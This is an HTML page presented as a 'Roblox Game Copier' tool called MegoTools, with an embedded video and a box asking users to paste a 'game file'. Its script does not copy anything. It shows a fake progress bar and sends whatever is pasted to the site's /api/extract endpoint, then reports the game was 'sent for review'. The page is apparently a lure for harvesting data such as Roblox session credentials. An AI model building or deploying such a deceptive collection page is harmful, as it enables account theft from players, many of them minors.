<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>MegoTools - Game Copier</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">

<style>
body{
margin:0;
height:100vh;
display:flex;
justify-content:center;
align-items:center;
font-family:'Orbitron', sans-serif;
color:white;
background:linear-gradient(-45deg,#0a0000,#200000,#3a0000,#0a0000);
background-size:400% 400%;
animation:bgmove 12s infinite;
}

@keyframes bgmove{
0%{background-position:0% 50%;}
50%{background-position:100% 50%;}
100%{background-position:0% 50%;}
}

.container{
background:rgba(20,0,0,0.9);
padding:40px;
width:480px;
border-radius:20px;
text-align:center;
box-shadow:0 0 20px #ff0000,0 0 60px rgba(255,0,0,0.5);
animation:fadein 1.5s;
}

@keyframes fadein{
from{opacity:0;transform:translateY(30px);}
to{opacity:1;transform:translateY(0);}
}

h1{margin:0;font-size:34px;color:#ff3c3c;text-shadow:0 0 10px red,0 0 20px red,0 0 40px red;}
.subtitle{margin-top:5px;margin-bottom:20px;color:#ff8b8b;font-size:13px;}
.video{margin-top:15px;margin-bottom:20px;}
.video iframe{width:100%;height:230px;border-radius:12px;border:none;box-shadow:0 0 20px red;}
input{width:100%;padding:14px;border:none;border-radius:10px;background:#120000;color:white;font-family:'Orbitron';font-size:14px;outline:none;}
button{margin-top:15px;width:100%;padding:14px;border:none;border-radius:10px;font-family:'Orbitron';font-size:16px;background:#ff0000;color:white;cursor:pointer;transition:0.25s;box-shadow:0 0 15px red;}
button:hover{transform:scale(1.05);box-shadow:0 0 20px red,0 0 40px red;}
.status{margin-top:18px;font-size:14px;color:#ff9a9a;min-height:22px;}
.progress{margin-top:12px;height:8px;background:#200000;border-radius:10px;overflow:hidden;}
.bar{height:100%;width:0%;background:linear-gradient(90deg,#ff0000,#ff4d4d);box-shadow:0 0 10px red;transition:width 5s linear;}
</style>
</head>

<body>
<div class="container">
<h1>MegoTools</h1>
<div class="subtitle">Roblox Game Copier</div>

<div class="video">
<iframe src="https://www.youtube.com/embed/iYovBUUiwjk" allowfullscreen></iframe>
</div>

<input id="gameInput" placeholder="Paste Game File Here">
<button onclick="extract()">Copy Game</button>

<div class="progress">
<div class="bar" id="bar"></div>
</div>

<div class="status" id="status"></div>
</div>

<script>
async function extract(){
let text=document.getElementById("gameInput").value;

if(!text){
document.getElementById("status").innerText="Invalid Input";
return;
}

document.getElementById("status").innerText="Started Copying Game (5 minutes)";
document.getElementById("bar").style.width="100%";

try{
await fetch("/api/extract",{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({text:text})
});
document.getElementById("status").innerText="Game sent for review!";
}catch(e){
document.getElementById("status").innerText="Error sending game!";
console.error(e);
}
}
</script>
</body>
</html>
